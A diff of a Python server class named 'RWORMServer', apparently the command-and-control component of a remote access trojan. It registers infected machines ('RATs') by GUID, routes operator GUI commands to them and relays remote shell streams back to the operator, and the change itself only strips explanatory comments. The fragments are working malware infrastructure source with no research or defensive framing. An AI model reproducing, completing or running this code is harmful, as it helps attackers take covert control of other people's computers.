@@ -18,15 +18,12 @@ class RWORMServer:
         self.db           = Database()
         self.running      = False
 
-        # gui_controllers: rat_session.id -> gui_session
         self.controllers      = {}
         self.controllers_lock = threading.Lock()
 
-        # shell_routes kept for backwards compat
         self.shell_routes = {}
         self.shell_lock   = threading.Lock()
 
-    # ─── Listen loop ─────────────────────────────────────────────────────────
     def start(self):
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -71,7 +68,6 @@ class RWORMServer:
                     if pkt:
                         self.process_packet(session, pkt)
                     else:
-                        # HMAC mismatch — clear buffer to avoid stuck state
                         print(f"[!] HMAC mismatch from {session.ip_address} — clearing buffer", flush=True)
                         buf = b""
                         break
@@ -100,14 +96,11 @@ class RWORMServer:
             self._forward_to_gui(session, t, packet.payload, channel=packet.session_id)
             return
 
-        if t == 0x02:   # SYSTEM_INFO — RAT identifying itself
+        if t == 0x02:
             try:
                 info = json.loads(packet.payload.decode('utf-8'))
                 session.set_system_info(info)
                 with self.clients_lock:
-                    # Same machine reconnecting over a new socket: drop any
-                    # older session holding this GUID so the Clients page
-                    # shows one live row per machine, not one per socket.
                     stale = [sid for sid, s in self.clients.items()
                              if s.guid == session.guid and sid != session.id]
                     for sid in stale:
@@ -129,7 +122,6 @@ class RWORMServer:
             return
 
         # ── All other packets: route based on whether session is a RAT ─────
-        # A RAT session has guid set (done by SYSTEM_INFO handler above).
         is_rat = session.guid is not None
 
         if is_rat:
@@ -156,7 +148,6 @@ class RWORMServer:
             print(f"[!] No RAT found for guid={guid[:8]}...", flush=True)
             return
 
-        # Track which GUI session controls this RAT
         with self.controllers_lock:
             self.controllers[rat.id] = gui_session
         if ptype == 0x20:
@@ -168,7 +159,6 @@ class RWORMServer:
 
     # ─── Forward RAT → GUI ────────────────────────────────────────────────────
     def _forward_to_gui(self, rat_session: ClientSession, ptype: int, payload: bytes, channel: int = 0):
-        # Special case: SHELL_STREAM needs shell_routes lookup first
         if ptype == 0x22 and rat_session.guid:
             with self.shell_lock:
                 gui = self.shell_routes.get(rat_session.id)
@@ -180,11 +170,9 @@ class RWORMServer:
                 gui.send(Packet(0x22, prefix + payload, session_id=channel).serialize())
             return
 
-        # All other RAT → GUI packets: prefix with guid\x00
         with self.controllers_lock:
             gui = self.controllers.get(rat_session.id)
         if not gui:
-            # Fall back to any GUI session (no guid = GUI)
             with self.clients_lock:
                 for s in self.all_sessions.values():
                     if s.guid is None and s.is_online:
@@ -216,11 +204,6 @@ class RWORMServer:
         session.send(Packet(0x11, data).serialize())
 
     def get_clients(self) -> list:
-        # A client machine reconnecting opens a new socket each time, so the
-        # same guid can appear under several session ids. Deduplicate by
-        # guid — keep the most recently seen live session — so the Clients
-        # page lists each machine exactly once. Prefer sessions that are
-        # still online over stale entries.
         with self.clients_lock:
             best = {}
             for s in self.clients.values():
@@ -230,7 +213,6 @@ class RWORMServer:
                 if cur is None:
                     best[s.guid] = s
                     continue
-                # online beats offline; otherwise newest last_seen wins
                 if s.is_online and not cur.is_online:
                     best[s.guid] = s
                 elif s.is_online == cur.is_online and s.last_seen > cur.last_seen:
@@ -239,8 +221,6 @@ class RWORMServer:
 
     def _find_rat_by_guid(self, guid: str):
         with self.clients_lock:
-            # Prefer a live session for this guid; a reconnect leaves stale
-            # entries behind that must not receive commands.
             live = None
             for s in self.clients.values():
                 if s.guid == guid:
